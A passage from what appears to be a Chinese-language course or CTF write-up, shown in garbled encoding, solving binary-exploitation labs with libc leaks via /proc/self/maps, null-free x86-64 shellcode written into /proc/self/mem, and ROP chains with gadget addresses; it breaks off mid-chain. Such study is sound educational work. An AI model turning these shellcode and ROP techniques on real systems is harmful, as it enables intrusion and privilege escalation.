æŒ‰ç…§å‰é¢æ‰€èªªæ‡‰è©²æ˜¯è¦å¯«/proc/[pid]/memï¼Œä½†å› ç‚ºå‰é¢æœ‰æåˆ°ä»–åªèƒ½è¢«open / read / lseekçµ¦accessï¼Œæ‰€ä»¥ç›®æ¨™æ‡‰è©²æ˜¯æ‰¾å‡ºlseekçš„offsetï¼Œä¸¦ä¸”æŠŠå™çˆ›shellcodeæ”¾é€²å»ï¼›å¦å¤–ä¸€å€‹å•é¡Œæ˜¯æˆ‘å€‘ä¸çŸ¥é“è¦å¯«åˆ°å“ªè£¡ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥åˆ©ç”¨å‰é¢çš„arbitrary readå»çœ‹processçš„mappingç‚ºä½•ï¼Œå¦‚ä¸‹</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Read /proc/self/maps to leak Libc Base</span>
</span></span><span style=display:flex><span>maps_layout <span style=color:#f92672>=</span> read_any_file(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/proc/self/maps&#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> int(maps_layout[<span style=color:#ae81ff>7</span>][:<span style=color:#ae81ff>12</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Libc Base address: </span><span style=color:#e6db74>{</span>hex(libc_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Puts Address: </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)</span></span></code></pre></div><p>é€™æ¨£çš„è©±ï¼Œæˆ‘å€‘å°±çŸ¥é“ä»–ä½æ–¼æ•´å€‹memory layoutï¼Œä»¥åŠæˆ‘å€‘æƒ³è¦ç½®æ›çš„puts symbolsçš„ä½ç½®</p></li><li><p>è¦å¯«ç”šéº¼
å‰é¢æœ‰æåˆ°æˆ‘å€‘éœ€è¦å¯«shellcodeé€²å»ï¼Œä»¥æ›¿æ›putsçš„è¡Œç‚ºï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦å¯«äº›ç”šéº¼serveræ‰èƒ½å™´flagçµ¦æˆ‘å€‘å‘¢?å¦‚ä¸‹</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e># Socket Config
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr_in</span> info;
</span></span><span style=display:flex><span>info.sin_family <span style=color:#f92672>=</span> PF_INET;
</span></span><span style=display:flex><span>info.sin_addr.s_addr <span style=color:#f92672>=</span> inet_addr(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>);
</span></span><span style=display:flex><span>info.sin_port <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>8765</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Connect to Backend
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>connect(fd, (<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>info, <span style=color:#66d9ef>sizeof</span>(info))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Write 0x8787 to fd
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>Command</span> cmd;
</span></span><span style=display:flex><span>cmd.cmd <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8787</span>;
</span></span><span style=display:flex><span>write(fd, <span style=color:#f92672>&amp;</span>cmd, <span style=color:#66d9ef>sizeof</span>(cmd));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Read the result from fd
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>Response</span> res;
</span></span><span style=display:flex><span>read(fd, <span style=color:#960050;background-color:#1e0010>$</span>rsp, <span style=color:#66d9ef>sizeof</span>(res);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Write the result from fd to stdout
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>write(<span style=color:#ae81ff>1</span>, <span style=color:#960050;background-color:#1e0010>$</span>rsp, <span style=color:#ae81ff>0x40</span>);</span></span></code></pre></div><p>ç°¡å–®ä¾†èªªï¼Œå‰é¢éœ€è¦æˆ‘å€‘è¨­å®šsocketçš„configï¼Œç„¶å¾Œç”¨é€™å€‹configé€£ç·šåˆ°å¾Œç«¯ï¼Œä¸¦ä¸”æŠŠcommandç½®æ›æˆ0x8787ï¼Œå‚³é€åˆ°å¾Œç«¯çµ¦çš„fdï¼Œé€™æ¨£å¾Œæ®µå°±æœƒç›´æ¥å™´flagçµ¦æˆ‘å€‘(æº–ç¢ºä¾†èªªæ˜¯é‚£å€‹fd)ï¼Œæ‰€ä»¥æˆ‘å€‘è¦æ‰¿æ¥fdæ¥åˆ°çš„flagä¸¦ä¸”é€åˆ°stdoutï¼Œå¤§æ¦‚æ˜¯é€™æ¨£ï¼Œä½†é€™ä¸€é€£ä¸²çš„æ“ä½œå…¶å¯¦æ˜¯åŠ©æ•™ä¸€é–‹å§‹åœ¨èª²å ‚ä¸­æœ‰æç¤ºï¼Œä¸¦ä¸”çœ‹äº†@cs-otakuçš„WPä¹Ÿæœ‰æåˆ°è©²æ­¥é©Ÿæ‰çŸ¥é“ï¼Œæ‰€ä»¥å¦‚æœéƒ½ä¸çŸ¥é“ä»¥ä¸Šæ“ä½œçš„è©±è¦æ€éº¼è¾¦å‘¢?æˆ‘å€‘å¯ä»¥æƒ³è¾¦æ³•æŠŠbackendçš„binaryè®€å‡ºä¾†ï¼Œé€™æ¨£çš„è©±å°±åªèƒ½è‡ªè¡ŒæŠŠbackendçš„binaryè®€å‡ºä¾†å†å»åˆ†æè£¡é¢çš„å¥§ç¾©</p><p>æˆ‘æ˜¯ç›´æ¥ç”¨<a href=https://godbolt.org/ rel=external target=_blank>godbolt</a>æ­é…<a href=https://defuse.ca/online-x86-assembler.htm#disassembly rel=external target=_blank>x86-64 disassembly</a>
:::spoiler godbolt Result
<a href=#R-image-2fdd1f62242b8735f6845df89f9ed2cc class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/B1hxShgL6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-2fdd1f62242b8735f6845df89f9ed2cc><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/B1hxShgL6.png></a>
:::
ä¸éæ­£å¦‚@cs-otakuèªªçš„</p><blockquote><p>å¯«å…¥contentæ˜¯ç”¨writeå»å¯«çš„ã€‚æ‰€ä»¥shellcodeè£¡é¢ä¸å¯ä»¥å‡ºç¾\x00é€™ç¨®æ±è¥¿</p></blockquote><p>æ‰€ä»¥æˆ‘ä¹Ÿæ˜¯é‚Šåƒè€ƒdisassemblyçš„çµæœæ…¢æ…¢çœ‹ä¸­é–“æœ‰æ²’æœ‰\x00çš„byteï¼Œå¦‚æœæœ‰å°±è¦æƒ³å…¶ä»–çš„payloadæ›¿æ›æ‰</p><ol><li>Socket Config
åƒæ˜¯é€™é‚Šæˆ‘ä¸çŸ¥é“<code>AF_INET</code>æ‰€ä»£è¡¨çš„byteæ˜¯å¤šå°‘å°±å¯ä»¥ç›´æ¥çœ‹godboltçš„çµæœï¼Œå¦å¤–syscallè¦ç”¨å“ªä¸€å€‹å¯ä»¥åƒè€ƒ<a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ rel=external target=_blank>linux x86-64 syscall</a>ï¼Œä¸¦ä¸”æ ¹æ“šcalling conventionæŠŠshellcodeæ“ºå¥½ï¼Œåˆ‡è¨˜çœ‹å®Œä¹‹å¾Œè¦çœ‹ä¸€ä¸‹è½‰æ›æˆshellcodeçœ‹æœ‰æ²’æœ‰\x00çš„byteï¼Œå¯ä»¥ç”¨pwntoolsçš„asm functionæˆ–æ˜¯ç›´æ¥ç”¨<a href=https://defuse.ca/online-x86-assembler.htm#disassembly rel=external target=_blank>x86-64 disassembly</a>éƒ½å¯ä»¥é”åˆ°ä¸€æ¨£çš„æ•ˆæœ
<a href=#R-image-a4fef00a56a11b213a743ef3b505057e class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HJUeP3lUp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-a4fef00a56a11b213a743ef3b505057e><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HJUeP3lUp.png></a><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># int fd = socket(AF_INET, SOCK_STREAM, 0);</span>
</span></span><span style=display:flex><span>socket <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov al, 0x29
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdi, rdi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dil, 0x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rsi, rsi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov sil, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov r8, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span></span></span></code></pre></div></li><li>Connect
é€™é‚Šä¸»è¦éœ€è¦è§€å¯Ÿprotocolæ€éº¼åŒ…ï¼Œé¦–å…ˆæˆ‘å€‘çŸ¥é“ç¬¬ä¸€å€‹åƒæ•¸æ˜¯å­˜$rdiï¼Œä¹Ÿå°±æ˜¯å­˜ä¸Šä¸€å€‹syscallçš„return valueå­˜èµ·ä¾†çš„$r8ï¼Œè‡³æ–¼$rsiçš„info addressï¼Œå…¶å…§å®¹æ‡‰è©²æ€éº¼åŒ…å«ç”šéº¼å‘¢?æˆ‘å€‘å…ˆçœ‹ä¸€ä¸‹<a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ rel=external target=_blank>linux x86-64 syscall</a>ä¸­çš„èªªæ˜
<a href=#R-image-df7e6de2d75fc2e6b091388fde61a8fc class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/BktiY2e8a.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-df7e6de2d75fc2e6b091388fde61a8fc><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/BktiY2e8a.png></a>
ä»–æ‰€éœ€çš„æ˜¯<code>struct sockaddr_in info;</code>ï¼Œè€Œå¯¦éš›å»çœ‹çœ‹sockaddr_inæœƒç™¼ç¾ä»–çš„çµæ§‹å¦‚ä¸‹(<a href=https://blog.csdn.net/dongyanxia1000/article/details/80683738 rel=external target=_blank>csdn post</a>):<div class="highlight wrap-code" dir=auto><pre tabindex=0><code>struct sockaddr_in {
        short   sin_family;         //address family
        u_short sin_port;           //16 bit TCP/UDP port number
        struct  in_addr sin_addr;   //32 bit IP address
        char    sin_zero[8];        //not use, for align
};</code></pre></div>å°±æœƒå°æ‡‰åˆ°åº•ä¸‹è¨»è§£çš„åœ°æ–¹ï¼ŒåŒ…å«IP / Post / Internet Familyä¹‹é¡çš„ï¼Œæ‰€ä»¥æˆ‘å€‘å°±å¯ä»¥æŒ‰ç…§é€™å€‹structureå»ºæ§‹å‡ºä¾†ï¼Œshortæ˜¯2 bytesï¼Œè€Œæ ¹æ“šå‰é¢çš„byte codeæœƒç™¼ç¾<code>AF_INET</code>æ˜¯\x0002ï¼Œä¹Ÿå°±æ˜¯å…©å€‹bytesï¼Œç¬¬äºŒå€‹æ˜¯portä¹Ÿæ˜¯å…©å€‹bytesï¼Œ8765è½‰æˆhexå°±æ˜¯0x223dï¼›æœ€å¾Œä¸€å€‹æ˜¯IP addressï¼Œç¸½å…±æ˜¯4 bytesçš„in_addr structureï¼Œå¦‚æœæƒ³è©³ç´°äº†è§£in_addrçš„çµæ§‹å¯ä»¥çœ‹<a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/ns-winsock2-in_addr?source=docs" rel=external target=_blank>MSDN</a>ï¼Œä½†å…·é«”ä¾†èªªå°±æ˜¯æŠŠ<code>127.0.0.1</code>â†’<code>7f000001</code>ï¼Œæ‰€ä»¥å…¨éƒ¨è²¼åœ¨ä¸€èµ·ä¸¦ä¸”è½‰æˆlittle endiançš„è©±å°±æœƒè®Šæˆ==0x100007f3d220002==ï¼Œä½†æœ‰ä¸€å€‹éå¸¸å¤§çš„å•é¡Œï¼Œå¦‚æœç›´æ¥æŠŠè©²å€¼pushé€²åˆ°stackä¸¦å–$rspæ”¾åˆ°$rsiçš„è©±ï¼Œæ•´å€‹æµç¨‹æœƒæœ‰å¤ªå¤šçš„\x00ï¼Œå› æ­¤@cs-otakuæä¾›äº†ä¸€å€‹éå¸¸æœ‰å‰µæ„çš„æƒ³æ³•ï¼Œå°±ç›´æ¥ç”¨æ‰£çš„ï¼Œåæ­£åªè¦æœ€å¾Œæ”¾åˆ°stackçš„å€¼æ˜¯å°çš„å°±å¥½äº†<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># struct sockaddr_in info;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># info.sin_family = AF_INET;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># info.sin_addr.s_addr = inet_addr(&#34;127.0.0.1&#34;);</span>
</span></span><span style=display:flex><span><span style=color:#75715e># info.sin_port = htons(8765);</span>
</span></span><span style=display:flex><span><span style=color:#75715e># connect(fd, (struct sockaddr *)&amp;info, sizeof(info));</span>
</span></span><span style=display:flex><span>connect <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov al, 0x2a
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rdi, r8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, 0xffffffffffffffff
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov r9, 0xfeffff80c2ddfffd
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    sub rsi, r9
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    push rsi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dl, 0x10
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span></span></span></code></pre></div></li><li>Write
é€™ä¸€æ®µä¸»è¦æ˜¯ç½®æ›åŸæœ¬ä¸æ‡‰è©²å‡ºç¾çš„commandï¼Œå› ç‚ºæŒ‰ç…§åŸæœ¬ç¨‹å¼çš„æµç¨‹ï¼Œåªæœƒæœ‰CMD_Registerâ†’0x1 / CMD_Loginâ†’0x2 / CMD_GetFolderâ†’0x11 / CMD_NewNoteâ†’0x12ç­‰é€™å››ç¨®ï¼Œåˆ†åˆ¥æœƒåœ¨å°æ‡‰çš„æ“ä½œä¸‹å‚³åˆ°backendå¾Œè®“ä»–åšå°æ‡‰çš„æ“ä½œï¼Œç¾åœ¨æˆ‘å€‘è¦æŠŠcmd.cmdæ”¹æˆ0x8787ï¼Œä¹‹å¾Œç”¨writeæŠŠé€™å€‹commandå¯«åˆ°å°æ‡‰çš„fdä¸­ï¼Œå¦‚åŒå…¶ä»–commandä¹Ÿé‚£æ¨£æ“ä½œä¸€æ¨£<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># struct Command cmd;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># cmd.cmd = 0x8787; // #define CMD_Flag 0x8787</span>
</span></span><span style=display:flex><span><span style=color:#75715e># write(fd, &amp;cmd, sizeof(cmd));</span>
</span></span><span style=display:flex><span>write <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor r9, r9
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov r9w, 0x8787
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    push r9
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov al, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rdi, r8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dl, 0xa4
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span></span></span></code></pre></div></li><li>Read
é€™ä¸€æ®µåŸæœ¬çš„commandæ‡‰è©²æ˜¯<code>read(fd, &amp;res, sizeof(res))</code>ï¼Œæˆ‘å€‘æœƒå»æ¥reså‚³å›ä¾†çš„çµæœï¼Œæ‰€ä»¥å¾Œé¢çš„sizeæ‡‰è©²ç›´æ¥çœ‹resä»–çš„çµæ§‹æœ‰å¤šå¤§è€Œå®šï¼Œç¸½å…±æ˜¯ä¸€å€‹uint32_tçš„code + 256å€‹charï¼Œæ‰€ä»¥æ˜¯260 bytesï¼Œä¹Ÿå°±æ˜¯0x104ï¼Œä¸¦ä¸”æˆ‘å€‘æŠŠresçš„åœ°å€å‚³çµ¦$rsp<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># read(fd, $rsp, sizeof(res));</span>
</span></span><span style=display:flex><span>read <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rdi, r8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dx, 0x104
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span></span></span></code></pre></div></li><li>Write 2 Console
ç¾åœ¨æˆ‘å€‘å·²ç¶“å–å¾—backendå‚³å›ä¾†çš„responseï¼Œä½†å‰ç«¯é‚„æ²’è¾¦æ³•é¡¯ç¤ºï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦å¯«åˆ°stdout<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># write(1, $rsp, 0x40);</span>
</span></span><span style=display:flex><span>write2console <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov al, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdi, rdi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dil, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dl, 0x40
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span></span></span></code></pre></div></li></ol></li><li><p>æ¥è‘—æˆ‘å€‘å°±åªè¦é€écommand 4çš„write noteåŠŸèƒ½æŠŠæ§‹å»ºå¥½çš„shellcodeï¼Œå¯«åˆ°/proc/self/memå°æ‡‰çš„ä½ç½®å°±å¥½ï¼Œä¹Ÿå°±æ˜¯ç½®æ›æ‰putsåŸæœ¬çš„æ“ä½œï¼Œè®“ä»–å†æ¬¡callåˆ°putsçš„æ™‚å€™å°±æœƒåŸ·è¡Œæˆ‘å€‘çš„shellcode</p></li></ol><h2 id=hw-notepad-stage3>HW-Notepad-Stage3</h2><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-5>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><ol><li>é¦–å…ˆï¼Œå¾Œç«¯æœ‰ä¸€å€‹æ´ï¼Œå°±æ˜¯åœ¨loginçš„writeï¼Œä»–çš„bufä»”ç´°å’Œå…¶ä»–æœ‰callåˆ°writeåšå°æ¯”æœƒç™¼ç¾ï¼Œä»–ä¸¦æ²’æœ‰æ¸…æ‰bufçš„å…§å®¹ï¼Œé€™ä»£è¡¨ä»–æœƒå®Œå®Œæ•´æ•´çš„æŠŠè£¡é¢çš„å…§å®¹é€åˆ°å‰ç«¯ï¼Œä½†ç‚ºç”šéº¼å‰é¢å…©é¡Œéƒ½æ²’æœ‰é€™å€‹å•é¡Œå‘¢?å› ç‚ºå‰ç«¯ä¸¦æ²’æœ‰æŠŠbufçš„å…§å®¹å°å‡ºä¾†ï¼Œæ‰€ä»¥é¦–è¦ç›®æ¨™æ˜¯æ‰¾åˆ°ä¸€å€‹æ–¹æ³•å¯ä»¥leakå‡ºå…§å®¹çš„shellcodeä¹‹é¡çš„ï¼Œé€™æ¨£æˆ‘å€‘å°±å¯ä»¥æŠ“åˆ°text / libc base address</li><li>çŸ¥é“é€™äº›äº‹æƒ…å¯ä»¥å¹¹å˜›å‘¢?check tokenæœ‰ä¸€å€‹bofçš„æ´ï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨é€™å€‹æ´ä¾†å‚³é€ropï¼Œæ‰€ä»¥éœ€è¦ret2libcæŠ“åˆ°base addressä¹‹å¾Œåœ¨è“‹rop</li><li>ROPå…·é«”çš„å…§å®¹æ˜¯ç”šéº¼å‘¢?æœ‰å…©ç¨®æ–¹æ³•å¯ä»¥æ‹¿åˆ°flagï¼Œä¸€å€‹æ˜¯æ‹¿åˆ°shellä¹‹å¾Œsetuid(0)ï¼Œå› ç‚ºbackend æœ‰ suid æ¬Šé™ï¼Œæ‰€ä»¥æˆ‘å€‘æ‰å¯ä»¥ç”¨ setuid(0) ä»¥root åŸ·è¡Œï¼Œç„¶å¾Œcat /flag_rootï¼›ç¬¬äºŒç¨®æ˜¯ç›´æ¥ORWï¼Œçœ‹flagæ˜¯å•¥é€™æ¨£</li></ol><h2 id=lab-rop_rw>Lab-ROP_RW</h2><p>Flag: <code>flag{ShUsHuSHU}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-6>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>å…ˆçœ‹é€™å€‹ç¨‹å¼çš„è¡Œç‚ºï¼Œåœ¨mainç•¶ä¸­ï¼Œä»–æœƒæ‰“é–‹flag.txtå’Œurandomé€™å…©å€‹fileï¼Œç„¶å¾Œåšå…©è€…çš„XORï¼Œä¸¦ä¸”å›å‚³urandomçš„å…§å®¹çµ¦æˆ‘å€‘ï¼Œä¸¦ä¸”æœ‰BOFçš„æ¼æ´å­˜åœ¨
:::info
flagå’Œsecreté€™å…©å€‹è®Šæ•¸éƒ½æ˜¯global variable
:::
è€Œchecké€™å€‹functionçš„åŠŸèƒ½æ˜¯æˆ‘å€‘å¯ä»¥è¼¸å…¥ä¸€å€‹inputï¼Œä»–æœƒå’ŒsecretåšXORï¼Œè‹¥çµæœç­‰æ–¼==kyoumokawaii==å°±æŠŠå‰é¢åŠ å¯†éçš„flagå†è·Ÿ<code>kyoumokawaii</code>åšXORä¸¦å›å‚³çµ¦æˆ‘å€‘</p><p>æ€è·¯å¾ˆç°¡å–®:
é›–ç„¶æ•´éš»ç¨‹å¼éƒ½æ²’æœ‰å‘¼å«åˆ°check functionï¼Œä½†å¦‚æœæˆ‘å€‘æ‹¿åˆ°secretï¼Œåˆå¯ä»¥é€²åˆ°checkï¼Œæ˜¯å¦å¯ä»¥åšä¸€äº›æ“ä½œæ‹¿åˆ°flag
ä¸€é–‹å§‹ä¸€å®šæœƒåšçš„äº‹æƒ…æ˜¯æŠŠflagåŠ å¯†
$$
cipher= flag \oplus secret\
$$
å¦‚æœå¯ä»¥é€²åˆ°check function
$$
input\leftarrow kyoumokawaii\oplus secret
$$
$$
output\leftarrow cipher\oplus kyoumokawaii=flag\oplus secret\oplus kyoumokawaii
$$
$$
flag = output\oplus secret\oplus kyoumokawaii
$$
æ­¤æ™‚<code>output</code>, <code>secret</code>éƒ½å·²çŸ¥ï¼Œæˆ‘å€‘åæ¨å‡ºflagç‚ºä½•ï¼Œä½†é‡é»æ˜¯è¦æ€éº¼å‘¼å«åˆ°check function?==ROP chain + BOF==</p><ol><li>å…ˆåˆ©ç”¨è©²éš»binaryçš„gadgetè“‹æˆæˆ‘å€‘éœ€è¦çš„chainï¼Œä¸¦ä¸”éš¨ä¾¿æ‰¾ä¸€å€‹å€é–“æ˜¯ä¸å¤ªæœƒå¯«å…¥çš„bss section address<div class="highlight wrap-code" dir=auto><pre tabindex=0><code>check_fn_addr = 0x4017ba
bss_section = 0x4c7f00
pop_rdx_rbx_ret = 0x0000000000485e8b
mov_qword_ptr_rdi_rdx_ret = 0x00000000004337e3
pop_rdi_ret = 0x00000000004020af
...
rop_chain = flat(
pop_rdi_ret,        bss_section,
pop_rdx_rbx_ret,    input_1,        0,
mov_qword_ptr_rdi_rdx_ret,
pop_rdi_ret,        bss_section + 0x8,
pop_rdx_rbx_ret,    input_2,        0,
mov_qword_ptr_rdi_rdx_ret,
pop_rdi_ret,        bss_section,
check_fn_addr
